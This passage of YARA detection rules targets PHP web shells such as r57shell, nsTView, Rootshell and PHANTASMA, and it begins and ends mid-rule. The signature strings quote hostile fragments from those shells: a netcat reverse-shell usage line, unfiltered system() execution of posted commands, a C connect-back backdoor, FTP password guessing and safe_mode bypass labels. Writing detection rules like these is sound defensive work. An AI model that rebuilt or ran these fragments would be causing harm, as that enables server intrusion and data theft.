      $s7 = "<a href=\"<?echo \"$fistik.php?dizin=$dizin/\" ?><?echo \"$ekinci\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s8 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif\"></td>" fullword ascii
      $s9 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\"></td>" fullword ascii
      $s10 = "00000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s11 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
      $s12 = "<td rowspan=\"2\" height=\"19\"><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?echo \"$dizin/$duzenle\"?></font></td>" fullword ascii
      $s13 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s14 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #0" fullword ascii
      $s15 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
      $s16 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
      $s17 = "<a href=\"<?echo \"$fistik.php?yenklas=1&dizin=$dizin\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s18 = "<a href=\"http://www.aventgrup.net\" style=\"text-decoration: none\">" fullword ascii
      $s19 = "set; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center\"" fullword ascii
      $s20 = "<a style=\"text-decoration: none\" target=\"_self\" href=\"<?echo \"$fistik\";?>.php?duzenle=<?echo \"$ekinci\";?>&dizin=<?echo " ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 70KB and ( 8 of them )
      ) or ( all of them )
}

rule _NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_SHELL_v_0_5_alpha_Lite_Public_Version_nsTView_v2_1_nstview_6 {
   meta:
      description = "php - from files NIX REMOTE WEB SHELL.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, nsTView v2.1.txt, nstview.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "51c3681b794a5b72f89a060fb21af32d11f1722b066b5063b962ebe99a3643cc"
      hash2 = "de84cafd9dd3faf0cf6987e7e6afc7aad90d249a00794aad5e83a6222ffe974f"
      hash3 = "65876ca1dde6923447642de1dbcc198b7f5bbe53c26d7eae7f1d675cb5f68774"
      hash4 = "a111977d2403dd241ef2fabe841b96535f05d004a276e12ad29462b565b8aaa8"
   strings:
      $s1 = "if (@move_uploaded_file(@$_FILES['text20']['tmp_name'], $uploadfile20)) {" fullword ascii
      $s2 = "if (@move_uploaded_file(@$_FILES['text13']['tmp_name'], $uploadfile13)) {" fullword ascii
      $s3 = "if (@move_uploaded_file(@$_FILES['text12']['tmp_name'], $uploadfile12)) {" fullword ascii
      $s4 = "if (@move_uploaded_file(@$_FILES['text10']['tmp_name'], $uploadfile10)) {" fullword ascii
      $s5 = "if (@move_uploaded_file(@$_FILES['text15']['tmp_name'], $uploadfile15)) {" fullword ascii
      $s6 = "if (@move_uploaded_file(@$_FILES['text19']['tmp_name'], $uploadfile19)) {" fullword ascii
      $s7 = "if (@move_uploaded_file(@$_FILES['text11']['tmp_name'], $uploadfile11)) {" fullword ascii
      $s8 = "if (@move_uploaded_file(@$_FILES['text14']['tmp_name'], $uploadfile14)) {" fullword ascii
      $s9 = "if (@move_uploaded_file(@$_FILES['text17']['tmp_name'], $uploadfile17)) {" fullword ascii
      $s10 = "if (@move_uploaded_file(@$_FILES['text16']['tmp_name'], $uploadfile16)) {" fullword ascii
      $s11 = "if (@move_uploaded_file(@$_FILES['text18']['tmp_name'], $uploadfile18)) {" fullword ascii
      $s12 = "if (@move_uploaded_file(@$_FILES['text8']['tmp_name'], $uploadfile8)) {" fullword ascii
      $s13 = "if (@move_uploaded_file(@$_FILES['text3']['tmp_name'], $uploadfile3)) {" fullword ascii
      $s14 = "if (@move_uploaded_file(@$_FILES['text5']['tmp_name'], $uploadfile5)) {" fullword ascii
      $s15 = "if (@move_uploaded_file(@$_FILES['text4']['tmp_name'], $uploadfile4)) {" fullword ascii
      $s16 = "if (@move_uploaded_file(@$_FILES['text2']['tmp_name'], $uploadfile2)) {" fullword ascii
      $s17 = "if (@move_uploaded_file(@$_FILES['text1']['tmp_name'], $uploadfile1)) {" fullword ascii
      $s18 = "if (@move_uploaded_file(@$_FILES['text9']['tmp_name'], $uploadfile9)) {" fullword ascii
      $s19 = "if (@move_uploaded_file(@$_FILES['text7']['tmp_name'], $uploadfile7)) {" fullword ascii
      $s20 = "if (@move_uploaded_file(@$_FILES['text6']['tmp_name'], $uploadfile6)) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57_r57shell_r57_Mohajer22_7 {
   meta:
      description = "php - from files r57.txt, r57shell.txt, r57_Mohajer22.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash2 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $x1 = "if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii
      $x2 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $x3 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x4 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $x5 = "$_POST['cmd'] = which('fetch').\" -o \".$_POST['loc_file'].\" -p \".$_POST['rem_file'].\"\";" fullword ascii
      $s6 = "$filedump = @fread($file,@filesize($_POST['loc_file']));" fullword ascii
      $s7 = "$filedump = @fread($file,@filesize($_POST['d_name']));" fullword ascii
      $s8 = "compress($filename,$filedump,$_POST['compress']);" fullword ascii
      $s9 = "tp_password']):(\"billy@microsoft.com\"))));" fullword ascii
      $s10 = "if(empty($_POST['from'])) { $_POST['from'] = 'billy@microsoft.com'; }" fullword ascii
      $s11 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s12 = "if(!empty($_POST['cmd']) && ($_POST['cmd']==\"ftp_file_up\" || $_POST['cmd']==\"ftp_file_down\"))" fullword ascii
      $s13 = "'eng_text101'=>'Use reverse (user -> resu) login for password'," fullword ascii
      $s14 = "$zipfile -> addFile($filedump, substr($filename, 0, -4));" fullword ascii
      $s15 = "if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }" fullword ascii
      $s16 = "'eng_text87'=>'Download files from remote ftp-server'," fullword ascii
      $s17 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"edit_file\" && !empty($_POST['e_name']))" fullword ascii
      $s18 = "function compress(&$filename,&$filedump,$compress)" fullword ascii
      $s19 = "if(empty($_POST['subj'])) { $_POST['subj'] = 'file from r57shell'; }" fullword ascii
      $s20 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57_r57_iFX_r57_kartal_8 {
   meta:
      description = "php - from files r57.txt, r57_iFX.txt, r57_kartal.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash2 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash3 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
   strings:
      $x1 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s2 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s3 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s4 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s5 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s6 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s7 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s8 = "echo sr(45,\"<b>\".$lang[$language.'_text84'].$arrow.\"</b>\".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),\"\");" fullword ascii
      $s9 = "/* else { if(($rows = @mssql_affected_rows($db)) > 0) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>affecte" fullword ascii
      $s10 = "if($error) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>\".$error.\"</b></font></td></tr></table>" fullword ascii
      $s11 = "if(($error = @ocierror())) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>\".$error['message'].\"</b>" fullword ascii
      $s12 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii
      $s13 = "$res=@pg_query($db,\"SELECT datname FROM pg_database WHERE datistemplate='f'\");" fullword ascii
      $s14 = "$res = @mssql_query(\"SELECT * FROM \".$_POST['mysql_tbl'].\"\", $db);" fullword ascii
      $s15 = "$res = @pg_query($db,\"SELECT * FROM \".$_POST['mysql_tbl'].\"\");" fullword ascii
      $s16 = "$str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbnam" ascii
      $s17 = "$str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbnam" ascii
      $s18 = "else echo \"<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to PostgreSQL server</b></font></div>\";" fullword ascii
      $s19 = "@ociexecute($stat);" fullword ascii
      $s20 = "for ($j = 1; $j <= @ocinumcols($stat); $j++) { echo \"<td><font face=Verdana size=-2>&nbsp;\".htmlspecialchars(@ociresult($s" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _rootshell_Rootshell_v_1_0_9 {
   meta:
      description = "php - from files rootshell.txt, Rootshell.v.1.0.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "c21235a1317419c8648c2d6567cb1c631dc137180e0e5f8dd8ac7b3a60312809"
      hash2 = "289e99b6279499a826cee1200de97387b1a8307f84beb1f0a74517439fe5815d"
   strings:
      $x1 = "back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>" fullword ascii
      $x2 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ Command Execute ]</font></td>" fullword ascii
      $s3 = "</i>after local command: <i>nc -v -l -p 3333 </i>(Windows)</font><br /><br /> <td><p align=\"center\"><br>" fullword ascii
      $s4 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea><br>" fullword ascii
      $s5 = "/*    0.3.2          666            coded a new uploader" fullword ascii
      $s6 = "<br><input type=\"submit\" value=\"Execute!\"><br>" fullword ascii
      $s7 = "<font face=\"Verdana\" style=\"font-size: 8pt\">Insert your commands here:</font><br>" fullword ascii
      $s8 = "<textarea size=\"70\" name=\"command\" rows=\"2\" cols=\"40\" ></textarea> <br>" fullword ascii
      $s9 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ File Upload ]</font></td>" fullword ascii
      $s10 = "<font face=\"Verdana\" style=\"font-size: 8pt\"><b>Current Directory:</b> <? echo $_SERVER['DOCUMENT_ROOT']; ?>" fullword ascii
      $s11 = "/*  ummQHMM9C!.uQo.??WMMMMNNQQkI!!?wqQQQQHMMMYC!.umx.?7WMNHmmmo */" fullword ascii
      $s12 = "//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - " fullword ascii
      $s13 = "/*    0.3.2          666            new password protection" fullword ascii
      $s14 = "/*    0.3.3          666            added a lot of comments :)" fullword ascii
      $s15 = "/*    0.3.1          666            password protection" fullword ascii
      $s16 = "/*    Also I think we should increase the last version number by 1 if you make some changes." fullword ascii
      $s17 = "/*  ^.^.jqNMM9C!^??UMMNmmmkOltOz+++zltlOzjQQNMMY?!`??WMNNmc^.^. */" fullword ascii
      $s18 = "/*    1.0.0          666            removed password protection (nobody needs it...)" fullword ascii
      $s19 = "/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */" fullword ascii
      $s20 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ Files & Directories ]</font></td>" fullword ascii
   condition:
      ( uint16(0) == 0x213c and filesize < 40KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57_r57_iFX_10 {
   meta:
      description = "php - from files r57.txt, r57_iFX.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash2 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii
      $s2 = "?? ?????? ??? GID (??????) \\r\\n- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)\"," fullword ascii
      $s3 = "$head = '<!-- ??????????  ???? -->" fullword ascii
      $s4 = "/*  ?? ?????? ??????? ????? ?????? ?? ????? ?????: http://rst.void.ru" fullword ascii
      $s5 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword ascii
      $s6 = "'ru_text85'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ?????????? ?????? ? MSSQL ???????'," fullword ascii
      $s7 = "????????? ???????? ????????????? ?????? ????? ? ???-?? ??????. ( ??????? ????????? ???? ????????? ???? )" fullword ascii
      $s8 = "'ru_text75'=>'* ????? ???????????? ?????????? ?????????'," fullword ascii
      $s9 = "'ru_text35'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ???????? ????? ? mysql'," fullword ascii
      $s10 = "'ru_text33'=>'???????? ??????????? ?????? ??????????? open_basedir ????? ??????? cURL'," fullword ascii
      $s11 = "'ru_text34'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ??????? include'," fullword ascii
      $s12 = "$sqh  = \"# homepage: http://rst.void.ru\\r\\n\";" fullword ascii
      $s13 = "'ru_text44'=>'?????????????? ????? ??????????! ?????? ?????? ??? ??????!'," fullword ascii
      $s14 = "if($GLOBALS['language']==\"ru\"){ $text = '??????! ?? ???? ???????? ? ???? '; }" fullword ascii
      $s15 = "if($GLOBALS['language']==\"ru\"){ $text = '??????! ?? ???? ????????? ???? '; }" fullword ascii
      $s16 = "'ru_text47'=>'???????? ???????? php.ini'," fullword ascii
      $s17 = "if($GLOBALS['language']==\"ru\"){ $text = \"?? ??????? ??????? \"; }" fullword ascii
      $s18 = "'ru_text71'=>\"?????? ???????? ???????:\\r\\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \\r\\n- ??? ??????? CHGR" ascii
      $s19 = "'ru_text71'=>\"?????? ???????? ???????:\\r\\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \\r\\n- ??? ??????? CHGR" ascii
      $s20 = "'ru_text76'=>'????? ?????? ? ?????? ? ??????? ??????? find'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _PHANTASMA_php_include_w_shell_11 {
   meta:
      description = "php - from files PHANTASMA.txt, php-include-w-shell.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "d722416bcf1f2aea420bece7082887fcab1dcca1aae970baeccb326179f7c4ba"
      hash2 = "8cb4cf774c954dca6f0dcbacba4ff768c495b4c97861e0b4722f6b17fbc5294b"
   strings:
      $s1 = "\"  printf(\\\"[*] Dumping Arguments\\\\n\\\");\\n\" ." fullword ascii
      $s2 = "\"  char msg[ ] = \\\"Welcome to Data Cha0s Connect Back Shell\\\\n\\\\n\\\"\\n\" ." fullword ascii
      $s3 = "\"  printf(\\\"[*] Spawning Shell\\\\n\\\");\\n\" ." fullword ascii
      $s4 = "\"                \\\"Issue \\\\\\\"export TERM=xterm; exec bash -i\\\\\\\"\\\\n\\\"\\n\" ." fullword ascii
      $s5 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword ascii
      $s6 = "\"    execl(\\\"/bin/sh\\\", \\\"shell\\\", NULL);\\n\" ." fullword ascii
      $s7 = "\"  he = gethostbyname(host);\\n\" ." fullword ascii
      $s8 = "\"                \\\"For Not Getting Logged.\\\\n(;\\\\n\\\\n\\\";\\n\" ." fullword ascii
      $s9 = "\"  } else if ((ia.s_addr = inet_addr(host)) == INADDR_ANY) {\\n\" ." fullword ascii
      $s10 = "\"  printf(\\\"[*] Resolving Host Name\\\\n\\\");\\n\" ." fullword ascii
      $s11 = "\"  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\\n\" ." fullword ascii
      $s12 = "\"    printf(\\\"[-] Unable to Resolve: %s\\\\n\\\", host);\\n\" ." fullword ascii
      $s13 = "\"  if (!(host = (char *) malloc(l))) {\\n\" ." fullword ascii
      $s14 = "\"  printf(\\\"Data Cha0s Connect Back Backdoor\\\\n\\\\n\\\");\\n\" ." fullword ascii
      $s15 = "\"                \\\"For More Reliable Shell.\\\\n\\\"\\n\" ." fullword ascii
      $s16 = "\"  strncpy(host, argv[1], l);\\n\" ." fullword ascii
      $s17 = "\"  if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {\\n\" ." fullword ascii
      $s18 = "$shell = \"#include <stdio.h>\\n\" ." fullword ascii
      $s19 = "\"  struct hostent *he;\\n\" ." fullword ascii
      $s20 = "@$get = fgets($sock[$cont]);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x433c ) and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57_r57_iFX_r57_kartal_r57_Mohajer22_12 {
   meta:
      description = "php - from files r57.txt, r57_iFX.txt, r57_kartal.txt, r57_Mohajer22.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash2 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash3 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s2 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"" fullword ascii
      $s3 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii
      $s4 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { echo re($_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s5 = "if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = \"3306\"; }" fullword ascii
      $s6 = "if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = \"1433\"; }" fullword ascii
      $s7 = "$lin2 = ex('sysctl -n kernel.osrelease');" fullword ascii
      $s8 = "$lin1 = ex('sysctl -n kernel.ostype');" fullword ascii
      $s9 = "else { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s10 = "<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'r57shell '.$version.'</b>" fullword ascii
      $s11 = "$sql = \"SELECT * FROM temp_r57_table;\";" fullword ascii
      $s12 = "$sql = \"DROP TABLE IF EXISTS temp_r57_table;\";" fullword ascii
      $s13 = "$sql = \"CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL );\";" fullword ascii
      $s14 = "if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }" fullword ascii
      $s15 = "echo (($safe_mode)?(\"safe_mode: <b><font color=green>ON</font></b>\"):(\"safe_mode: <b><font color=red>OFF</font></b>\"));" fullword ascii
      $s16 = "if ($_POST['cmd']==\"db_query\")" fullword ascii
      $s17 = "if(!$file=@fopen($_POST['e_name'],\"w\")) { echo we($_POST['e_name']); }" fullword ascii
      $s18 = "echo ws(3).@get_current_user().\"<br>\";" fullword ascii
      $s19 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_size($all).\"</b>\";" fullword ascii
      $s20 = "if($windows) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w')).\"\\n\"; }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57_r57_Mohajer22_13 {
   meta:
      description = "php - from files r57.txt, r57_Mohajer22.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash2 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $x1 = "if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s2 = "$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s3 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"download_file\" && !empty($_POST['d_name']))" fullword ascii
      $s4 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail_file\" && !empty($_POST['loc_file']))" fullword ascii
      $s5 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { echo re($_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s6 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { echo re($_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s7 = "if(!$connection) { fe($language,0); $_POST['cmd'] = \"\"; }" fullword ascii
      $s8 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail\")" fullword ascii
      $s9 = "@print \"<img src=\\\"http://127.0.0.1/r57shell/version.php?img=1&version=\".$current_version.\"\\\" border=0 height=0 width=0>" ascii
      $s10 = "echo sr(25,\"<b>\".$lang[$language.'_text91'].$arrow.\"</b>\",in('radio','compress',0,'none').' '.$arh);" fullword ascii
      $s11 = "echo sr(15,\"<b>\".$lang[$language.'_text91'].$arrow.\"</b>\",in('radio','compress',0,'none').' '.$arh);" fullword ascii
      $s12 = "$res = mail($_POST['to'],$_POST['subj'],$_POST['text'],\"From: \".$POST['from'].\"\\r\\n\");" fullword ascii
      $s13 = "echo $fs.$table_up1.$lang[$language.'_text76'].up_down('id8').$table_up2.div('id8').$ts;" fullword ascii
      $s14 = "echo $fs.$table_up1.$lang[$language.'_text94'].up_down('id18').$table_up2.div('id18').$ts;" fullword ascii
      $s15 = "echo $fs.$table_up1.$lang[$language.'_text34'].up_down('id11').$table_up2.div('id11').$ts;" fullword ascii
      $s16 = "echo $fs.$table_up1.$lang[$language.'_text54'].up_down('id7').$table_up2.div('id7').$ts;" fullword ascii
      $s17 = "echo $fs.$table_up1.$lang[$language.'_text57'].up_down('id4').$table_up2.div('id4').$ts;" fullword ascii
      $s18 = "echo $fs.$table_up1.$lang[$language.'_text35'].up_down('id12').$table_up2.div('id12').$ts;" fullword ascii
      $s19 = "echo $fs.$table_up1.$lang[$language.'_text33'].up_down('id10').$table_up2.div('id10').$ts;" fullword ascii
      $s20 = "echo $fs.$table_up1.$lang[$language.'_text42'].up_down('id3').$table_up2.div('id3').$ts;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _NIX_REMOTE_WEB_SHELL_nsTView_v2_1_nstview_14 {
   meta:
      description = "php - from files NIX REMOTE WEB SHELL.txt, nsTView v2.1.txt, nstview.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "51c3681b794a5b72f89a060fb21af32d11f1722b066b5063b962ebe99a3643cc"
      hash2 = "65876ca1dde6923447642de1dbcc198b7f5bbe53c26d7eae7f1d675cb5f68774"
      hash3 = "a111977d2403dd241ef2fabe841b96535f05d004a276e12ad29462b565b8aaa8"
   strings:
      $s1 = "header(\"Content-disposition: attachment; filename=\\\"$download\\\";\");" fullword ascii
      $s2 = "if(!isset($login)){$login=\"root\";}" fullword ascii
      $s3 = "nt></td><td bgcolor=$color>&nbsp;</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>\";" fullword ascii
      $s4 = "echo \"DELETE FOLDER: <font color=red>\".@$_GET['delfolder'].\"</font><br>" fullword ascii
      $s5 = "readfile(\"$d/$download\");" fullword ascii
      $s6 = "if(!isset($adress)){$adress=\"localhost\";}" fullword ascii
      $s7 = "$query = \"SELECT * FROM $vn LIMIT $from,$to\";" fullword ascii
      $s8 = "mysql_select_db($db) or die(mysql_error());" fullword ascii
      $s9 = "@$delfolder=$_GET['delfolder'];" fullword ascii
      $s10 = "if(!isset($port)){$port=\"3306\";}" fullword ascii
      $s11 = "@$dir=$_GET['dir'];" fullword ascii
      $s12 = "if(@eregi(\"/\",$whereme)){$os=\"unix\";}else{$os=\"win\";}" fullword ascii
      $s13 = "if(@$_GET['delfl']){" fullword ascii
      $s14 = "if(@$_GET['deldir']){" fullword ascii
      $s15 = "while($mn = mysql_fetch_array($result, MYSQL_ASSOC)){" fullword ascii
      $s16 = "if(!isset($pass)){$pass=\"\";}" fullword ascii
      $s17 = "$c=mysql_query (\"SELECT COUNT(*) FROM $str[0]\");" fullword ascii
      $s18 = "print \"</tr></td></table> </td></tr></table>\";" fullword ascii
      $s19 = "for ($i=0;$i<mysql_num_fields($result);$i++){" fullword ascii
      $s20 = "$c=mysql_query (\"SELECT COUNT(*) FROM $tbl\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57_iFX_r57_kartal_15 {
   meta:
      description = "php - from files r57_iFX.txt, r57_kartal.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash2 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
   strings:
      $x1 = "$_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s2 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s3 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"edit_file\")" fullword ascii
      $s4 = "echo $table_up1.$lang[$language.'_text81'].$table_up2.$ts.\"<tr>\".$fs.\"<td valign=top width=34%>\".$ts;" fullword ascii
      $s5 = "echo $table_up1.$lang[$language.'_text82'].$table_up2.$ts.\"<tr>\".$fs.\"<td valign=top width=34%>\".$ts;" fullword ascii
      $s6 = "echo \" | - \".$row2['TABLE_NAME'].\"\\r\\n\";" fullword ascii
      $s7 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text40'].\"</div></b></font>\";" fullword ascii
      $s8 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text12'].\"</div></b></font>\";" fullword ascii
      $s9 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text22'].\"</div></b></font>\";" fullword ascii
      $s10 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text83'].\"</div></b></font>\";" fullword ascii
      $s11 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text77'].\"</div></b></font>\";" fullword ascii
      $s12 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text9'].\"</div></b></font>\";" fullword ascii
